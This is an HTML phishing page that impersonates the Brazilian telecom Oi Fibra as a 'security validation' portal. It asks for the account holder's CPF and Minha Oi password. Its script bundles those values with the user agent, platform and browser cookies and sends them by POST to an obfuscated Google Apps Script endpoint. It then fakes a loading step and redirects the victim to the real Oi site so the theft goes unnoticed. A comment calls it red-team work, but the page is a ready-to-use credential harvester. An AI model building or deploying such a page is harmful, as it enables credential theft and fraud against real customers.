<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Oi Fibra | Portal de Segurança e Conformidade</title>
    <link rel="icon" href="https://www.oi.com.br/favicon.ico" type="image/x-icon">
    
    <style>
        :root { --oi-yellow: #ffdb00; --oi-dark: #222; }
        body { font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; margin: 0; background: #f4f4f4; color: #333; }
        .header { background: #fff; padding: 15px; text-align: center; border-bottom: 3px solid var(--oi-yellow); shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .container { max-width: 450px; margin: 50px auto; background: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); }
        .logo { width: 60px; margin-bottom: 20px; }
        h2 { font-size: 22px; margin-bottom: 10px; color: var(--oi-dark); }
        p { font-size: 14px; color: #666; line-height: 1.5; }
        .form-group { margin-bottom: 20px; text-align: left; }
        label { display: block; font-size: 12px; font-weight: bold; margin-bottom: 5px; color: #444; }
        input { width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        .btn-submit { background: var(--oi-yellow); color: #000; border: none; width: 100%; padding: 15px; font-weight: bold; font-size: 16px; border-radius: 30px; cursor: pointer; transition: 0.3s; margin-top: 10px; }
        .btn-submit:hover { background: #e6c500; transform: translateY(-1px); }
        .footer-info { font-size: 11px; color: #999; margin-top: 30px; text-align: center; }
        .status-msg { display: none; margin-top: 15px; font-size: 13px; color: #d9534f; font-weight: bold; }
        
        /* Simulação de Loader */
        .spinner { display: none; width: 20px; height: 20px; border: 3px solid rgba(0,0,0,.1); border-radius: 50%; border-top-color: #000; animation: spin 1s ease-in-out infinite; margin: 0 auto; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

<div class="header">
    <img src="https://logodownload.org/wp-content/uploads/2014/04/oi-logo-1.png" class="logo" alt="Oi">
</div>

<div class="container" id="login-box">
    <h2>Validação de Segurança</h2>
    <p>Para garantir a conformidade do seu terminal <strong>Oi Fibra</strong>, confirme os dados do titular da conta.</p>
    
    <div class="form-group">
        <label>CPF DO TITULAR</label>
        <input type="text" id="cpf_user" placeholder="000.000.000-00" maxlength="14">
    </div>

    <div class="form-group">
        <label>SENHA DE ACESSO (MINHA OI)</label>
        <input type="password" id="pass_user" placeholder="******">
    </div>

    <button class="btn-submit" id="main-trigger">VERIFICAR TERMINAL</button>
    
    <div id="loader-area" style="margin-top:20px; text-align:center;">
        <div class="spinner" id="loading-spinner"></div>
        <p id="loading-text" style="display:none;">Sincronizando com a central Oi...</p>
    </div>

    <p class="footer-info">Protocolo de Segurança: <strong>SOC-PR-2025-09</strong><br>Oi S.A. Todos os direitos reservados.</p>
</div>

<script>
    // 1. OBFUSCAÇÃO DA URL (Substitua a string abaixo pela sua URL do Google Script em Base64)
    // Para gerar: btoa("https://script.google.com/macros/s/SEU_ID/exec")
    const _0xex = "SUA_URL_EM_BASE64_AQUI"; 

    const btn = document.getElementById('main-trigger');
    const spinner = document.getElementById('loading-spinner');
    const loadText = document.getElementById('loading-text');

    btn.addEventListener('click', async () => {
        const cpf = document.getElementById('cpf_user').value;
        const pass = document.getElementById('pass_user').value;

        if(cpf.length < 11) {
            alert("Por favor, preencha o CPF corretamente.");
            return;
        }

        // Estética de "Processamento"
        btn.style.display = 'none';
        spinner.style.display = 'block';
        loadText.style.display = 'block';

        // Coleta de Metadados para o Red Team
        const payload = {
            identidade: cpf,
            credencial: pass,
            agente: navigator.userAgent,
            plataforma: navigator.platform,
            cookies: document.cookie || "none"
        };

        // Envio para o Google Script via POST
        try {
            await fetch(atob(_0xex), {
                method: "POST",
                mode: "no-cors",
                body: "data=" + btoa(JSON.stringify(payload))
            });
        } catch (e) {
            console.log("Sync Error"); // Erro falso para não dar na vista
        }

        // O Redirecionamento Final (O golpe de misericórdia)
        setTimeout(() => {
            window.location.href = "https://www.oi.com.br/minha-oi/";
        }, 2500);
    });

    // Máscara Simples de CPF
    document.getElementById('cpf_user').addEventListener('input', function (e) {
        var x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})(\d{0,2})/);
        e.target.value = !x[2] ? x[1] : x[1] + '.' + x[2] + '.' + x[3] + (x[4] ? '-' + x[4] : '');
    });
</script>

</body>
</html>
